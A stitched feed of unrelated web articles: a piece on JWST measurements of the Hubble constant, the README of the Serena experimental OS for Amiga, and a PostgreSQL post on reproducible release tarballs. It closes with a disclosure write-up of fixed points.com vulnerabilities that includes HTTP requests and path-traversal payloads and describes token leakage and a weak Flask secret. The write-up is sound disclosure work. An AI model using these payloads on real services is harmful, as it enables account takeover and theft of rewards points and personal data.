</div></div><figure><div><p><img alt="A woman with black hair is seated in an armchair in front of a wall-spanning photo of the night sky." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2024/08/WendyFreedman-crNancyWong.webp"></p></div><figcaption><div><p>Wendy Freedman at the University of Chicago is exploring how Webb telescope observations can be squared with the standard cosmological model.</p><p>Nancy Wong</p></div></figcaption></figure><div><h2>Introduction</h2><div><p>But Freedman suspects that the Cepheid-based H<sub>0</sub> measurement is not as trustworthy as the others. It is extremely sensitive to assumptions about, for example, the elemental composition of the Cepheids, and each star’s neighborhood. Dust in the galactic disks where Cepheids live can absorb their light and dim them. The Webb’s infrared vision pierces the dust, but astronomers need to know how much dust is absorbing light so they can correct for it. For this, Freedman and her colleagues turned to archival Hubble telescope data, which captures the “dust depth,” but it’s not as high-resolution as Webb data. That added uncertainties in the calculated distances, she said.</p>
<p>Another issue surfaced. The 11 galaxies they studied with the Webb telescope are the ones nearest to Earth that host all four relevant objects (JAGBs, TRGBs, Cepheids and the relevant type of supernova). But according to Freedman, the galaxies’ supernovas seemed to be intrinsically brighter than the ones in farther galaxies. This is another puzzle cosmologists have yet to understand, and it also affects the H<sub>0</sub> value. “I think this is going to be where we’re really going to all have to focus our attention on in the next few years,” she said.</p>
<p>Their paper reports three separate H<sub>0</sub> values. The JAGB measurement — the one that was done in a completely blind way, without any subsequent correcting — gives 67.96 km/s/Mpc, give or take 1.71 km/s/Mpc. That’s smack-dab on top of the theoretical prediction, seeming to confirm the standard model of cosmology.</p>
<p>TRGBs yield a value of 69.85 with similar error margins. The result also alleviates the Hubble tension.</p>

<p>The Cepheid method put the value of H<sub>0</sub> higher, at 72.05, but with more subjectivity involved: Different assumptions about the stars’ characteristics caused the value to range from 69 to 73. The high end of the range matches Riess’ measurements; at the low end, the Hubble tension all but goes away.</p>
<p>“I don’t think we can just say that the Hubble constant is&nbsp;73,” Freedman said. “I think this is the first test of the&nbsp;Cepheid distance scale,” meaning that JAGBs and TRGBs are serving as a check on the more established method. “And we’re not getting the same answer when we test the Cepheids. So I&nbsp;think it’s important.”</p>
<p>Combining the methods and uncertainties yielded an average H<sub>0</sub> value of 69.96 with a 4% uncertainty. That margin of error overlaps with both the theoretical prediction for the cosmic expansion rate and Riess’ team’s higher value.</p>
<p>“We don’t yet, I think, have the evidence to&nbsp;unambiguously conclude that there’s a [Hubble] tension,” Freedman said. “I just don’t see it.”</p>
<p>“Everything depends on tracking down all of these systematic errors,” Perlmutter said.</p>
<h2><strong>Tensions and Resolutions</strong></h2>
<p>The James Webb Space Telescope is also enabling additional ways to measure H<sub>0</sub>. For instance, astronomers are in the early phases of using how mottled a galaxy looks as a proxy for its distance. The idea is simple: Closer galaxies look clumpier because you can resolve some of their stars, whereas more distant galaxies appear smoother. “It’s basically a way to turn the crowding into a measure of distance,” said Anand, who is involved with this project in addition to his work with Riess.</p>

<p>A different method also offers some hope: A massive cluster of galaxies acts like a warped magnifying glass, bending and magnifying the image of an object behind it and creating multiple images of the same object as its light takes multiple paths. The University of Arizona astronomer <a href="https://www.as.arizona.edu/people/faculty/brenda-frye">Brenda Frye</a> leads a program to observe seven clusters with the Webb telescope. When Frye and her colleagues looked at their first telescope image last year, featuring the massive galaxy cluster G165, “we all just said, ‘What are those three dots that weren’t there before?’” she recalled. The dots were three separate images of the same supernova that had exploded behind the cluster.</p>
<p>After repeatedly observing the image, they could calculate the differences between the arrival times of the three lensed supernova images. The time delay is proportional to, and can be used to infer, the Hubble constant. “[It] is a one-step measurement for H<sub>0</sub>,” Frye said, “which makes it completely independent.” They <a href="https://arxiv.org/abs/2403.18902">measured</a> an expansion rate of 75.4 km/s/Mpc, although with a large uncertainty of +8.1 or −5.5 km/s/Mpc. Frye expects to refine those error bars after a few more years of similar measurements.</p>
<p>Both Riess’ and Freedman’s teams also anticipate that the next few years of JWST observations will enable them to home in on an answer with their traditional, star-based methods.</p>
<p>“With the improvement in the data, this is ultimately going to be solved, and I think pretty quickly,” Freedman said. “We’re going to get to the bottom of this.”</p>

            <description><![CDATA[<p>URL: <a href="https://github.com/dplanitzer/Serena">https://github.com/dplanitzer/Serena</a>, See on <a href="https://news.ycombinator.com/item?id=41233811">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">About The Project</h2><a id="user-content-about-the-project" aria-label="Permalink: About The Project" href="#about-the-project"></a></p>
<p dir="auto">Serena is an experimental operating system based on modern design principles with support for pervasive preemptive concurrency and multiple users. The kernel is object-oriented and designed to be cross-platform and future proof. It runs on Amiga systems with a 68030 or better CPU installed.</p>
<p dir="auto">One aspect that sets it aside from traditional threading-based OSs is that it is purely built around dispatch queues somewhat similar to Apple's Grand Central Dispatch. There is no support for creating threads in user space nor in kernel space. Instead the kernel implements a virtual processor concept where it dynamically manages a pool of virtual processors. The size of the pool is automatically adjusted based on the needs of the dispatch queues and virtual processors are assigned to processes as needed. All kernel and user space concurrency is achieved by creating dispatch queues and by submitting work items to dispatch queues. Work items are simply closures (a function with associated state) from the viewpoint of the user.</p>
<p dir="auto">Another interesting aspect is interrupt handling. Code which wants to react to an interrupt can register a counting semaphore with the interrupt controller for the interrupt it wants to handle. The interrupt controller will then signal the semaphore every time the interrupt occurs. Use of a counting semaphore ensures that the code which is interested in the interrupt does not miss the occurrence of an interrupt. The advantage of translating interrupts into signals on a semaphore is that the interrupt handling code executes in a well-defined context that is the same kind of context that any other kind of code runs in. It also gives the interrupt handling code more flexibility since it does not have to immediately react to an interrupt. The information that an interrupt has happened is never lost, whether the interrupt handler code happened to be busy with other things at the time of the interrupt or not.</p>
<p dir="auto">The kernel is generally reentrant. This means that virtual processors continue to be scheduled and context switched preemptively even while the CPU is executing inside the kernel. Additionally a full compliment of counting semaphores, condition variables and lock APIs are available inside the kernel. The API of those objects closely resembles what you would find in a user space implementation of a traditional OS.</p>
<p dir="auto">Serena implements a hierarchical process structure similar to POSIX. A process may spawn a number of child processes and it may pass a command line and environment variables to its children. A process accesses I/O resources via I/O channels which are similar to file descriptors in POSIX.</p>
<p dir="auto">There are two notable differences between the POSIX style process model and the Serena model though: first instead of using fork() followed by exec() to spawn a new process, you use a single function in Serena called Process_Spawn(). This makes spawning a process much faster and significantly less error prone.</p>
<p dir="auto">Secondly, a child process does not inherit the file descriptors of its parent by default. The only exception are the file descriptors 0, 1 and 2 which represent the terminal input and output streams. This model is much less error prone compared to the POSIX model where a process has to be careful to close file descriptors that it doesn't want to pass on to a child process before it spawns a child. Doing this was easy in the early days of Unix when applications were pretty much self contained and when there was no support for dynamic libraries. It's the opposite today because applications are far more complex and depend on many 3rd party libraries.</p>
<p dir="auto">The executable file format at this time is the Atari ST GemDos file format which is a close relative to the aout executable format. This file format will be eventually replaced with a file format that will be able to support dynamic libraries. However for now it is good enough to get the job done.</p>
<p dir="auto">The kernel implements SerenaFS which is a hierarchical file system with permissions and user and group information. A file system may be mounted on top of a directory located in another file system to expand the file namespace. All this works similar to how it works in POSIX systems. A process which wants to spawn a child process can specify that the child process should be confined to a sub-tree of the global file system namespace.</p>
<p dir="auto">The boot file system is currently RAM-based. The ROM contains a disk image which is created with the diskimage tool and which serves as a template for the RAM disk. This ROM disk image is copied to RAM at boot time.</p>
<p dir="auto">User space has support for libc, libsystem, libclap and the very beginnings of libm. Libsystem is a library that implements the user space side of the kernel interface. Libclap is a library that implements argument parsing for command line interface programs.</p>
<p dir="auto">Serena OS comes with a shell which implements a formally defined shell language. You can find the shell document <a href="https://github.com/dplanitzer/Serena/blob/main/Commands/shell/README.md">here</a>.</p>

<p dir="auto"><h2 tabindex="-1" dir="auto">Getting Started</h2><a id="user-content-getting-started" aria-label="Permalink: Getting Started" href="#getting-started"></a></p>
<p dir="auto">Setting the project up for development and running the OS is a bit involved. The instructions below are for Windows but they should work pretty much the same on Linux and macOS.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Prerequisites</h3><a id="user-content-prerequisites" aria-label="Permalink: Prerequisites" href="#prerequisites"></a></p>
<p dir="auto">The first thing you will need is an Amiga computer emulator. I'm using WinUAE which you can download from <a href="https://www.winuae.net/download" rel="nofollow">https://www.winuae.net/download</a></p>
<p dir="auto">Download the WinUAE installer and run it. This will place the emulator inside the 'Program Files' directory on your boot drive.</p>
<p dir="auto">Next download and install the VBCC compiler and assembler needed to build the operating system. You can find the project homepage is at <a href="http://www.compilers.de/vbcc.html" rel="nofollow">http://www.compilers.de/vbcc.html</a> and the download page for the tools at <a href="http://sun.hasenbraten.de/vbcc" rel="nofollow">http://sun.hasenbraten.de/vbcc</a>.</p>
<p dir="auto">The version that I'm using for my development and that I know works correctly on Windows 11 is 0.9h. Be sure to add an environment variable with the name <code>VBCC</code> which points to the VBCC folder on your disk and add the <code>vbcc\bin</code> folder to the <code>PATH</code> environment variable.</p>
<p dir="auto">Note that you need to have Microsoft Visual Studio and command line tools installed because the Microsoft C compiler is needed to build the build tools on Windows.</p>
<p dir="auto">Finally install GNU make for Windows and make sure that it is in the <code>PATH</code> environment variable. A straight-forward way to do this is by executing the following winget command in a shell window: <code>winget install GnuWin32.Make</code>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Building the Build Tools</h3><a id="user-content-building-the-build-tools" aria-label="Permalink: Building the Build Tools" href="#building-the-build-tools"></a></p>
<p dir="auto">You only need to execute this step once and before you try to build the OS. The purpose of this step is to build a couple of tools that are needed to build the kernel and user space libraries. You can find documentation for these tools <a href="https://github.com/dplanitzer/Serena/blob/main/Tools/README.md">here</a>.</p>
<p dir="auto">First open a Developer Command Prompt in Windows Terminal and then cd into the <code>Serena/Tools</code> folder. Type <code>make</code> and hit return. This will build all required tools and place them inside a <code>Serena/build/tools</code> folder. The tools will be retained in this location even if you do a full clean of the OS project.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Building the Operating System</h3><a id="user-content-building-the-operating-system" aria-label="Permalink: Building the Operating System" href="#building-the-operating-system"></a></p>
<p dir="auto">Open the Serena project folder in Visual Studio Code and select <code>Build All</code> from the <code>Run Build Task...</code> menu. This will build the kernel, libsystem, libc, libm and shell and generate a single <code>Serena.rom</code> file inside the <code>Serena/product/Kernel/</code> folder. This ROM file contains the kernel, user space libraries and the shell.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Running the Demo</h3><a id="user-content-running-the-demo" aria-label="Permalink: Running the Demo" href="#running-the-demo"></a></p>
<p dir="auto">First you'll need to create an Amiga configuration with at least a 68030 CPU (i.e. Amiga 3000 or 4000) in WinUAE if you haven't already. The easiest way to do this is by going to Quickstart and selecting A4000 as the model. Then go to the Hardware/ROM page and update the "Main ROM file" text field such that it points to the <code>Serena.rom</code> file inside the <code>Serena/build/product/</code> folder on your disk. Finally give your virtual Amiga at least 1MB of Fast RAM by going to the Hardware/RAM page and setting the "Slow" entry to 1MB. Save this configuration so that you don't have to recreate it next time you want to run the OS.</p>
<p dir="auto">Load the configuration and then hit the Start button or simply double-click the configuration in the Configurations page to run the OS. The emulator should open a screen that shows a boot message and then a shell prompt. See the <a href="https://github.com/dplanitzer/Serena/blob/main/Commands/shell/README.md">shell</a> page for a list of commands that are supported by the shell.</p>

  <div itemprop="articleBody">
    <p>When the PostgreSQL project makes a release, the primary artifact of
that is the publication of a <a href="https://ftp.postgresql.org/pub/source/">source code
tarball</a>.  That represents the
output of all the work that went into the creation of the PostgreSQL
software up to the point of the release.  The source tarball is then
used downstream by packagers to make binary packages (or file system
images or installation scripts or similar things), or by some to build
the software from source by hand.</p>

<p>Creating a source code tarball is actually quite tricky to do by hand.
Of course, you could just run “tar” over a currently checked out
source tree.  But you need to be careful that the checkout is clean
and not locally modified.  You need to ensure that all the files that
belong in the tarball end up there and no other files.  There are
certain source control files that you don’t want to include in the
tarball.  File permissions and file ownership need to be sane.  And
all this should work consistently across platforms and across time.
Fortunately, this has all been
<a href="https://git.postgresql.org/gitweb/?p=postgresql.git;a=blob;f=GNUmakefile.in;h=9c18c562330c5beefb239db52359c7fa27012c1b;hb=05ffe9398b758bbb8d30cc76e9bbc638dab2d477#l85">scripted</a>
and has been pretty reliable over the years.</p>

<p>Additionally, a PostgreSQL source code tarball has included various
prebuilt files.  These are files that are not actually part of the
source code checked into Git, but they would be built as part of a
normal compilation.  For example, a source code tarball has included
prebuilt Bison and Flex files, various .c and .h files generated by
Perl scripts, and HTML and man page documentation built from DocBook
XML files.  The reason for this is a mix of convenience and
<a href="https://www.gnu.org/prep/standards/html_node/Releases.html">traditional
practice</a>.
All these output files are platform-independent and independent of
build options.  So everyone will get the same ones anyway, so we might
as well prebuild them.  Also, that way, users of the source tarball
won’t need the tools to build these files.  For example, you didn’t
actually need Perl to build PostgreSQL from a source tarball, because
all the files generated from Perl scripts were already built.  Also,
historically (very historically), PostgreSQL was pushing the limits of
Bison and Flex (or various other yacc and lex implementations, when
those were still supported), so it was convenient and less error-prone
to give everyone the same prebuilt Bison and Flex output files.</p>

<p>This system has two major problems that have now led to the point that
we got rid of it in PostgreSQL&nbsp;17.</p>

<p>First, implementing and maintaining this arrangement in the build
system is quite tricky.  You need to carefully maintain the different
states of “clean source code”, “partially built source code”, and
“fully built source code”, and the commands to transition between
them.  (This was <code>make distprep</code> and <code>make all</code>, and then <code>make clean</code>
and <code>make maintainer-clean</code> to move the other way.)  Making it work
with out-of-tree (“vpath”) builds was extremely weird: If you built
from a source tarball, the Bison (etc.) output files were in the
source directory, but if you build from a Git checkout, the Bison
output files were in the build directory, and you need to support both
of these sanely.  Finally, the new Meson build system is extremely
allergic against writing build output into the source directory.</p>

<p>Some of the historical reasons are also obsolete.  It’s not a problem
anymore to get a good version of Bison and Flex installed.  Everybody
can easily get Perl installed nowadays.  The documentation build can
still be a bit tricky, but it’s generally much easier and robust than
a few decades ago.</p>

<p>Second, a lot more attention is nowadays paid to the software supply
chain.  There are security and legal reasons for this.  When users
install software, they want to know where it came from, and they want
to be sure that they got the right thing, not some fake version or
some version of dubious legal provenance.</p>

<p>The downstream packaging practice has already paid attention to this
for many years.  Packages or package repositories are
cryptographically signed, so you can be sure that what you install
came from a trustworthy source.  There have also been efforts to make
binary builds <a href="https://reproducible-builds.org/">reproducible</a>, so
that you can be sure that the binary files in your binary package are
what you’d expect them to be.  Some packagers have policies that
everything needs to be built from source, so they’d just delete and
rebuild the prebuilt files anyway.</p>

<p>At the other end of the software production pipeline, using Git as the
source control system gives some integrity guarantees that you are
getting the same source code that everybody else is getting.  So if
I’m looking at commit
<a href="https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=b18b3a8150dbb150124bd345e000d6dc92f3d6dd">b18b3a8150dbb150124bd345e000d6dc92f3d6dd</a>
and I see that same commit on various public servers, that’s probably
the same commit that everybody else is seeing.  And I can check what
the parents of that commit are and how the code got to that point and
so on.</p>

<p>But what we didn’t have until now is a transparent and reproducible
way to get from that commit to the release tarball.</p>

<p>The way the <a href="https://wiki.postgresql.org/wiki/Release_process">tarball creation
works</a> is that the
person who prepares the release runs <code>make dist</code> on a machine that is
specially kept “clean” for that purpose.  How can a third party verify
this process?  The produced tarball was not perfectly reproducible.
If you run <code>make dist</code> yourself, you’ll get a similar but not
identical tarball.  A way to verify whether a tarball was sane was to
unpack it and diff the contents against a source directory or an
unpacked tarball that you made yourself.  But this requires manual
judgment.  The Bison and Flex files won’t be the same unless you used
the identical versions.  The built documentation also won’t be
perfectly identical.  File timestamps will be different.  Also you’d
need to carefully check manually whether files are missing or too
many.  This was not fully satisfactory.</p>

<p>(This work overlapped with the discovery of the <a href="https://en.wikipedia.org/wiki/XZ_Utils_backdoor">XZ Utils
backdoor</a>, which
exploited (among other things) exactly this non-reproducible tarball
creation process.  But I want to be clear that this is a complete
coincidence, and this work was neither done as a response to that nor
are there are any suspicions that any PostgreSQL tarballs might have
been compromised.)</p>

<p>Anyway, with PostgreSQL 17, this is changed.  The tarball generation
is still invoked by calling <code>make dist</code>, but that
<a href="https://git.postgresql.org/gitweb/?p=postgresql.git;a=blob;f=GNUmakefile.in;h=cf6e759486eded7bf95e12617bfa2d6765eeffdf;hb=b18b3a8150dbb150124bd345e000d6dc92f3d6dd#l85">internally</a>
now calls <a href="https://git-scm.com/docs/git-archive"><code>git archive</code></a>.  <code>git
archive</code> packs the files belonging to a given Git commit into a tar
(or other) archive in a reproducible and verifiable way.  Therefore,
if I now run <code>make dist</code> on a given commit (such as a release tag),
then I will get the exact same (bit-identical) tarball as the next
person.  A packager can now trace the tarball back to the Git
repository, and in turn an end-user can trace a binary package back to
the Git repository as well (assuming reproducible builds, which is an
ongoing struggle).</p>

<p>(To be clear, this change is only in major version PostgreSQL 17 and
(presumably) future major versions.  The maintenance releases for
older major versions (16 and back) will continue to be published using
the old method until they go out of support.)</p>

<p><a href="https://www.postgresql.org/message-id/flat/40e80f77-a294-4f29-a16f-e21bc7bc75fc%40eisentraut.org">Getting this to
work</a>
was also not entirely straightforward.  You need to carefully
calibrate the <code>git archive</code> options to make sure this works
consistently across platforms and local Git configurations.  Which is
why we’re keeping the <code>make dist</code> invocation as a wrapper.  Also, you
need a new enough version of Git for this (2.38.0 or newer).
Currently, the Git version used to produce the release tarballs (on
the above-mentioned “clean” box) is too old to create reproducible
<code>.tar.gz</code> tarballs, but it will create reproducible <code>.tar.bz2</code>
tarballs.  The latter is what most users and packagers use anyway.  If
you care about this, avoid the <code>.tar.gz</code> for now.</p>

<p>I think this is progress, if you care about software supply chain
integrity.  (It’s also a relief if you care about maintaining the
build system.)  There are certainly more things that could be done.
One thing mentioned above is that reproducible builds don’t work for
PostgreSQL in all situations.  My understanding is that this needs to
be fixed elsewhere, though.  Another topic is more traceability about
how things get <em>into</em> the Git repository.  The <code>make dist</code> change only
ensures that once code is in the Git repository, you can trace it from
there, ideally all the way to the end user installation.  There are,
of course, various technical and social processes in the PostgreSQL
developer community that monitor the integrity of the source code, but
there is nothing currently that checks in a computerized,
cryptographic way the origin of what goes into the Git repository.  So
something like signed commits might be worth looking into in the
future in order to improve this further.</p>

<div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2>
<p>Between March 2023 and May 2023, we identified multiple security vulnerabilities within points.com, the backend provider for a significant portion of airline and hotel rewards programs. These vulnerabilities would have enabled an attacker to access sensitive customer account information, including names, billing addresses, redacted credit card details, emails, phone numbers, and transaction records. Moreover, the attacker could exploit these vulnerabilities to perform actions such as transferring points from customer accounts and gaining unauthorized access to a global administrator website. This unauthorized access would grant the attacker full permissions to issue reward points, manage rewards programs, oversee customer accounts, and execute various administrative functions.</p>
<p>Upon reporting these vulnerabilities, the points.com team responded very quickly, acknowledging each report within an hour. They promptly took affected websites offline to conduct thorough investigations and subsequently patched all identified issues. All vulnerabilities reported in this blog post have since been remediated.</p>

<h2 id="high-level-overview">High Level Overview</h2>
<p>The following is a high level overview of the reported vulnerabilities. For the technical write-ups, please scroll down to the "Investigating Points.com" section.</p>
<p><strong>Directory Traversal leads to Query Access to Points.com Customer Order Records (March 7, 2023)</strong></p>
<p>Our first report was an unauthenticated HTTP path traversal allowing access to an internal API which would've allowed an attacker to query entries from a set of 22 million order records. The data within the records included partial credit card numbers, home addresses, email addresses, phone numbers, reward points numbers, customer authorization tokens, and miscellaneous transaction details. This information could be queried through an API call that returned one-hundred results per HTTP request. By appending optional sorting parameters, an attacker could enumerate the data or query for specific information (e.g. searching a customer's name or email address).</p>
<p><strong>Ability to Transfer Rewards Points and Leak Customer Information using only Rewards Number and Surname (March 7, 2023)</strong></p>
<p>The second vulnerability we reported was an authorization bypass that would allow an attacker to transfer airline rewards points from other users by knowing only their surname and rewards points number (both of these fields were disclosed in our first vulnerability report) via an improperly configured API. An attacker could generate full account authorization tokens which would allow them to manage customer accounts, view order history, view billing information, view contact information, and transfer points from customers.</p>
<p>For both of the initial reports, the team responded in under 10 minutes and immediately took the websites offline. The issues were quickly fixed and the websites were back online shortly thereafter.</p>
<p><strong>Leaked Tenant Credentials for Virgin Rewards Program allows Attacker to Sign API Requests on Behalf of Virgin (Add/Remove Rewards Points, Access Customer Accounts, Modify Rewards Program Settings, etc.)</strong></p>
<p>On May 2nd, 2023, we discovered an endpoint on a points.com-hosted Virgin rewards website that leaked the "macID" and "macKey" used by Virgin to authenticate to the core points.com API on behalf of the airline. The credentials could be used to fully authenticate as the airline to the "lcp.points.com" API by signing HTTP requests using the disclosed secret, allowing an attacker to call any of the API calls intended for the airline like modifying customer accounts, adding/removing points, or modifying settings related to the Virgin rewards program.</p>
<p>The points.com team responded and fixed the issue within only an hour.</p>
<p><strong>New Method for Transferring Airline Miles and Accessing Customer Account and Order Information from United MileagePlus members (April 29th, 2023)</strong></p>
<p>On April 29th, 2023, we identified an additional fourth vulnerability affecting specifically United Airlines where an attacker could generate an authorization token for any user knowing only their rewards number and surname. Through this issue, an attacker could both transfer miles to themselves and authenticate as the member on multiple apps related to MileagePlus, potentially including the MileagePlus administrator panel. This issue disclosed the member's name, billing address, redacted credit card information, email, phone number, and past transactions on the account.</p>
<p>After reporting the issue, the team responded in under 10 minutes and immediately took the website offline. The issue was quickly fixed and the website was back online shortly thereafter.</p>
<p><strong>Full Access to Global Points.com Administration Console and Loyalty Wallet Administration Panel via Weak Flask Session Secret (May 2nd, 2023)</strong></p>
<p>On May 2nd, 2023, we identified that the Flask session secret for the points.com global administration website used to manage all airline tenant and customer accounts was the word "secret". After discovering this vulnerability, we were able to resign our session cookies with full super administrator permissions.</p>
<p>After resigning the cookie with roles that give full administrator permissions, we observed that we could access all core administration functionality on the website, including user lookup, manual bonuses, rewards points conversion modifications (e.g. setting the exchange rate between two programs where 1 point would give you 1 million points), and many more points.com administrative endpoints (e.g. managing promotions, branding, resetting loyalty program credentials, etc.). An attacker could abuse this access to revoke existing reward program credentials and temporarily take down airline rewards functionality.</p>
<p>For our last vulnerability report, the team responded within an hour (even though we'd reported it at 3:30 AM CST) by taking the website offline and changing the secret.</p>
<h2 id="investigating-pointscom">Investigating Points.com</h2>
<p>With the cost of air travel becoming so expensive recently, I've gotten more and more into the "credit card churning" community where you can try to gamify credit cards and purchases to save rewards points which can be converted into things like flights and hotels. From a hacker's perspective, it's super interesting seeing a system that stores a numeric value that's essentially one-step from being used as an actual currency. The more and more I used these systems, the more interested I became in figuring out how they worked and what systems actually powered the rewards points industry.</p>
<p>I sent a message to <a href="https://twitter.com/iangcarroll">Ian Carroll</a>, someone who has a huge amount of experience hacking airlines who also runs an airline rewards booking website called <a href="https://seats.aero/">seats.aero</a>, expressing my interest in finding vulnerabilities in the rewards program infrastructure. After chatting for a while, we then pulled in <a href="https://twitter.com/infosec_au">Shubham Shah</a>, another another hacker who has been hunting on airlines for years, and started a group chat with the goal of finding security vulnerabilities affecting the rewards points ecosystem.</p>
<p>When we began our research, we found that a company called points.com was the provider for nearly all major rewards programs globally. Every airline that I'd ever flown had used points.com as their backend for storing and processing reward points. They seemed to be the leader in the space, and they even had a <a href="https://points.com/.well-known/security.txt">security.txt</a> page on their website.</p>
<h3 id="how-does-it-all-work">How does it all work?</h3>
<p>After searching through Github and reading points.com documentation for a few hours, we found that there was an API built for rewards programs to use running on the "lcp.points.com" website. While looking through public repositories, we found a link to what looked like API documentation for the "lcp.points.com" API that had since been removed from the internet. Luckily for us, there was a copy of it available on archive.org.</p>
<p>The archived API documentation described ways in which reward programs could authenticate users, reward loyalty points, transfer loyalty points, spend loyalty points, and much more.</p>

<p>Our initial thought here was "how do we get access to use the API on behalf of a rewards program?", and after exploring a bit, we found the "console.points.com" website which allowed public registration for rewards programs to create skeleton accounts that had to be manually approved.</p>

<p>After authenticating to this portal, we observed that it was an administration console for the rewards programs where they could initialize and manage OAuth-type apps. The apps were provisioned API keys that interacted with the "LCP API" (short for "Loyalty Commerce Platform") which was the "lcp.points.com" host.</p>
<p>The next thing we did was examine the JavaScript that powered the dashboard. We discovered that the website "console.points.com" appeared to be utilized by points.com employees for executing administrative actions concerning customer accounts, rewards programs, and managing components of the website itself.</p>
<p>The rewards program API used by rewards programs to manage points and customer accounts (lcp.points.com) required two keys to interact with it, both of which were distributed when you registered to the console.points.com website:</p>
<ul>
<li>macKeyIdentifier: essentially an OAuth client_id</li>
<li>macKey: essentially an OAuth client_secret</li>
</ul>
<p>Using the above two variables that we obtain by registering an app on "console.points.com", we were able to sign HTTP requests to the "lcp.points.com" host via the OAuth 2.0 MAC authentication scheme and call the loyalty platform API.</p>

<p>The fact that the platform employed this form of authorization was somewhat frustrating as it both meant we'd have to write a wrapper for signing HTTP requests to fuzz the API and that the secret key wouldn't be included in HTTP requests sent by the rewards programs. If we found a vulnerability like SSRF on an airline program, for example, the key itself would not be leaked to us, only the signature for the specific HTTP request that the airline was trying to make.</p>
<p>We fuzzed the API for a long time (manually signing each HTTP request using a Python script) and failed to find any one-off authorization vulnerabilities. It was trivial to find the numeric IDs of other airline programs, but unfortunately we were unable to find any basic core API vulnerabilities like IDOR or privilege escalation. We decided to change routes to better understand how the publicly listed customer rewards programs were using the points.com infrastructure.</p>
<h2 id="exploring-the-united-airlines-points-management-website">Exploring the United Airlines Points Management Website</h2>
<p>Since United Airlines was leveraging points.com for their rewards program, we thought it would be interesting to test one of their apps that was integrated with points.com. We found the following MileagePlus domain which was used to buy, transfer, and manage MileagePlus miles:</p>
<pre><code>https://buymiles.mileageplus.com/united/united_landing_page/#/en-US
</code></pre>
<p>After fuzzing the site for a little while, we soon realized that the "buymiles.mileageplus.com" website was actually hosted by points.com and not United Airlines. We became super curious how the website worked from an authorization perspective and began to test the intended functionality of the site.</p>

<p>After completing the OAuth-type flow, it appeared that the "memberValidation" token acted as a user authorization token for the points.com airline tenant whereby we could use this token repeatedly to perform API calls and authenticate as a user.</p>
<p>If we could generate this token for another user, we would be able to perform actions on their account like transferring airline miles and retrieving their personal information. This became one of our goals as we learned more about how the airline website was leveraging the points.com infrastructure, and something we explored further.</p>

<p>When you landed on this page as an authenticated MileagePlus user, it would ask you to add a recipient to send miles to. The recipient input field took in a first name, last name, and a MileagePlus number. When we sent the HTTP request to add the recipient, we noticed something super interesting returned in the response:</p>
<p><strong>HTTP Request</strong></p>

<p>The HTTP response contained the member's authorization token, something that we previously learned is used to retrieve their information and transfer miles on their behalf!</p>
<p>The vulnerability worked like this: by sending their first name, last name, and rewards number through the normal website UI for adding a points recipient, the server would return an authorization token in the HTTP response which could be used to retrieve their billing address, phone number, email, redacted credit card information, and billing history. We could additionally transfer miles on their behalf using this token.</p>
<p>To use the leaked token, we could simply take it and plug it into any of the API calls on the website and perform actions like transferring miles or simply retrieving the member's PII. We were able to fully authenticate into the victim account by only knowing their surname and rewards point number!</p>

<h3 id="escalating-the-issue-to-affect-other-rewards-programs">Escalating the issue to affect other rewards programs</h3>
<p>At this point, after discovering it was possible to access customer accounts knowing only their surname and rewards number, we were curious if there were other endpoints on the "buymiles.mileageplus.com" site that had similar permission issues but didn't require us to know any prerequisite information about the customer (our bug felt very lame at this time).</p>
<p>We noticed that there was a parameter present in the original vulnerable HTTP request for generating member authorization tokens called "lpId''. According to the LCP API documentation, this parameter referred to the loyalty program UUID (e.g. Delta, United, Southwest, etc.). It appeared that the API on United's website was hitting the same API which other programs like Delta or Emirates used.</p>
<p>We were able to validate that we could exploit this vulnerability to access other rewards program customer accounts by swapping the loyalty program UUID and user rewards number to that of another program from our first vulnerability. If we swapped the loyalty UUID and rewards number to a Delta customer, it would return the authorization token a victim within the different rewards program.</p>
<p>Interestingly, this behavior also demonstrated that this was hitting a universal points.com API which seemed to be connected to all loyalty programs versus only United Airlines.</p>

<p>After escalating the issue to generating authorization tokens for any airline, we began to fuzz the vulnerable HTTP request and soon realized that the loyalty program UUID parameter was being sent as an HTTP path argument to a proxied HTTP server.</p>
<p>We discovered this by observing strange behavior when appending a question mark and pound symbol at the end of the loyalty program ID parameter, breaking the HTTP request being sent by the server:</p>
<p><strong>HTTP Request</strong></p>
<pre><code>POST /mileage-plus-transfer/mvs/recipient HTTP/<span>1.1</span>
Host<span>:</span> buymiles.mileageplus.com

<span>{</span><span>"mvPayload"</span><span>:</span><span>{</span><span>}</span><span>,</span><span>"lpId"</span><span>:</span><span>"0ccbb8ee-5129-44dd-9f66-a79eb853da73**#**"</span><span>}</span> &lt;-- pound symbol appended
</code></pre>
<p><strong>HTTP Response</strong></p>
<pre><code>HTTP/<span>1.1</span> <span>400</span> Bad Request
Content-type<span>:</span> application/json

<span>{</span><span>"error"</span><span>:</span><span>"Cannot process type 'text/html', expected 'application/json'"</span><span>}</span>
</code></pre>
<p>Our immediate guess was that the "lpId" parameter was being sent to the "lcp.points.com" API and, after we appended the question mark, it would break the HTTP response so that the backend could not interpret the HTTP response from the second server. We sought to confirm that by guessing the directories before and after the loyalty program UUID and seeing if the API would still function normally.</p>
<p>After testing for a while, we validated that each of the following payloads would allow us to normally add a recipient, allowing us to validate that the HTTP request was in-fact proxied to a second HTTP server. We did this by reading the LCP API documentation and observing that many of the HTTP requests with loyalty program UUIDs had a previous directory of "lps" and an appended directory of "mvs". By sending these additional directories and receiving the normal 200 OK HTTP response, it meant that we were able to traverse on the API and could potentially hit other API endpoints.</p>
<pre><code><span>"lpId"</span><span>:</span><span>"/0ccbb8ee-5129-44dd-9f66-a79eb853da73"</span>
<span>"lpId"</span><span>:</span><span>"/../lps/0ccbb8ee-5129-44dd-9f66-a79eb853da73"</span>
<span>"lpId"</span><span>:</span><span>"0ccbb8ee-5129-44dd-9f66-a79eb853da73/mvs/?"</span>
<span>"lpId"</span><span>:</span><span>"/../lps/0ccbb8ee-5129-44dd-9f66-a79eb853da73/mvs/?"</span>
</code></pre>
